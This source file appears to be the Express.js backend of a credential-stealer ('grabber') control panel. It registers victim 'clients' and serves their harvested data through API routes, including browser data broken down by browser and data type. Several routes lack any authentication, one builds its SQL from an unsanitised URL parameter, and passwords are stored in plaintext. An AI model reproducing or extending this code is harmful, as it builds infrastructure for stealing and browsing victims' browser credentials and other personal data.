const express = require("express");
const router = express.Router();
const db = require("../../database.js");
const jwt = require("jsonwebtoken");
const { generateId } = require("../../service/utils.js");

const grabber = require("../scan/grabber.js");

router.use("/admin", grabber);

router.post("/register", function (req, res) {
  const body = req.body;
  const name = body.name;
  const email = body.email;
  const company = body.company;
  const bio = body.bio;
  const password = body.password;

  if (!req.user || !req.user.id || req.user.type !== "user") {
    res.status(401).json({
      message: "error",
      data: "You must be logged in to register a client",
    });
    return;
  }

  // Check if the user is an admin
  const user_sql = `SELECT * FROM users WHERE id=?`;
  const user_params = [req.user.id];

  db.get(user_sql, user_params, function (err, row) {
    if (err) {
      res.status(400).json({ error: err.message });
      return;
    }
    console.log("Row: ", row);

    if (!row) {
      res.status(401).json({
        message: "error",
        data: "You must be logged in to register a client",
      });
      return;

      // Check if the user is an admin
    } else {
      if (name === "" || email === "" || password === "") {
        res.status(400).json({
          message: "error",
          data: "Invalid request",
        });
        return;
      }
      const emailRegex = /\S+@\S+\.\S+/;
      if (!emailRegex.test(email)) {
        res.status(400).json({
          message: "error",
          data: "Invalid email",
        });
        return;
      }

      const sql = `INSERT INTO clients (owner_id, name, email, password, company, bio, token, has_grabber, last_active) VALUES (?,?,?,?,?,?,?,?,?)`;
      const params = [
        row.id,
        name,
        email,
        password,
        company,
        bio,
        generateId(),
        false,
        new Date().toISOString(),
      ];

      db.run(sql, params, function (err, result) {
        if (err) {
          res.status(400).json({ error: err.message });
          return;
        }

        res.json({
          message: "success",
          data: {
            id: this.lastID,
          },
        });
      });
    }
  });
});

router.get("/getall", function (req, res) {
  const sql = `SELECT * FROM grabber`;
  const params = [];

  db.all(sql, params, function (err, rows) {
    if (err) {
      res.status(400).json({ error: err.message });
      return;
    }

    res.json({
      message: "success",
      data: rows,
    });
  });
});

router.get("/clients", function (req, res) {
  if (!req.user || !req.user.id || req.user.type !== "user") {
    res.status(401).json({
      message: "error",
      data: "You must be logged in to view clients",
    });
    return;
  }

  const sql = `SELECT * FROM clients WHERE owner_id=?`;
  const params = [req.user.id];

  db.all(sql, params, function (err, rows) {
    if (err) {
      res.status(400).json({ error: err.message });
      return;
    }

    res.json({
      message: "success",
      data: rows,
    });
  });
});

router.get("/client/:id", function (req, res) {
  if (!req.user || !req.user.id || req.user.type !== "user") {
    res.status(401).json({
      message: "error",
      data: "You must be logged in to view clients",
    });
    return;
  }

  const sql = `SELECT * FROM clients WHERE id=?`;
  const params = [req.params.id];

  db.get(sql, params, function (err, row) {
    if (err) {
      res.status(400).json({ error: err.message });
      return;
    }

    if (!row) {
      res.json({
        message: "success",
        data: { client: "Not found" },
      });
      return;
    }

    res.json({
      message: "success",
      data: row,
    });
  });
});

router.get("/client/:client/:dataType", function (req, res) {
  const sql = `SELECT ${req.params.dataType} FROM grabber WHERE client=?`;
  const params = [req.params.client];

  db.get(sql, params, function (err, row) {
    if (err) {
      res.status(400).json({ error: err.message });
      return;
    }

    if (!row) {
      res.json({
        message: "success",
        data: { client: "Not found" },
      });
      return;
    }

    res.json({
      message: "success",
      data: JSON.parse(row[req.params.dataType]), // Update this to 'dataType' if needed
    });
  });
});

router.get("/client/:client/browser/:browser", function (req, res) {
  const sql = `SELECT browser FROM grabber WHERE client=?`;
  const params = [req.params.client];

  db.get(sql, params, function (err, row) {
    if (err) {
      res.status(400).json({ error: err.message });
      return;
    }

    if (!row) {
      res.json({
        message: "success",
        data: { client: "Not found" },
      });
      return;
    }

    // Parse the JSON
    const browserData = JSON.parse(row.browser);

    const browserKeys = Object.keys(browserData);

    const browserDataFormatted = Object.entries(browserData).map(
      ([browserKey, browser]) => {
        let data = {};

        Object.keys(browser).forEach((v) => {
          data[v] = browser[v];
        });

        return {
          name: browserKey,
          data: data,
        };
      }
    );

    //console.log("Sorted browser data: ", sortedBrowserData);

    res.json({
      message: "success",
      data: browserDataFormatted.find((v) => v.name === req.params.browser),
    });
  });
});

router.get(
  "/client/:client/browser/:browser/:browserType",
  function (req, res) {
    const sql = `SELECT browser FROM grabber WHERE client=?`;
    const params = [req.params.client];

    db.get(sql, params, function (err, row) {
      if (err) {
        res.status(400).json({ error: err.message });
        return;
      }

      if (!row) {
        res.json({
          message: "success",
          data: { client: "Not found" },
        });
        return;
      }

      // Parse the JSON
      const browserData = JSON.parse(row.browser);

      const browserDataFormatted = Object.entries(browserData).map(
        ([browserKey, browser]) => {
          let data = {};

          Object.keys(browser).find((v) => {
            if (v === req.params.browserType) {
              data = browser[v];
            }
          });

          return {
            name: browserKey,
            data: data,
          };
        }
      );

      //console.log("Sorted browser data: ", sortedBrowserData);

      res.json({
        message: "success",
        data: browserDataFormatted.find((v) => v.name === req.params.browser),
      });
    });
  }
);

// Custom Routes for special data types
router.get("/client/:id/browsers/pre", function (req, res) {
  const sql = `SELECT browser FROM grabber WHERE id=?`;
  const params = [req.params.id];

  if (!req.user || !req.user.id || req.user.type !== "user") {
    res.status(401).json({
      message: "error",
      data: "You must be logged in to view clients",
    });
    return;
  }

  db.get(sql, params, function (err, row) {
    if (err) {
      res.status(400).json({ error: err.message });
      return;
    }

    if (!row) {
      res.json({
        message: "success",
        data: { client: "Not found" },
      });
      return;
    }

    // Parse the JSON
    const browserData = JSON.parse(row.browser);

    const browserKeys = Object.keys(browserData);

    const browserDataFormatted = Object.entries(browserData).map(
      ([browserKey, browser]) => {
        let data = {};

        Object.keys(browser).forEach((v) => {
          // Check the typeof a single result, if string JSON parse it, if not, leave it
          const typeOfResults = typeof browser[v]?.results[0];
          data[v] =
            typeOfResults === "string"
              ? JSON.parse(browser[v]?.results).length
              : browser[v]?.results?.length || 0;
        });

        return {
          name: browserKey,
          data: data,
        };
      }
    );

    // Sort it by the browser that has the most results
    const sortedBrowserData = browserDataFormatted.sort((a, b) => {
      return (
        Object.values(b.data).reduce((a, b) => a + b) -
        Object.values(a.data).reduce((a, b) => a + b)
      );
    });

    //console.log("Sorted browser data: ", sortedBrowserData);

    res.json({
      message: "success",
      data: sortedBrowserData,
    });
  });
});

module.exports = router;
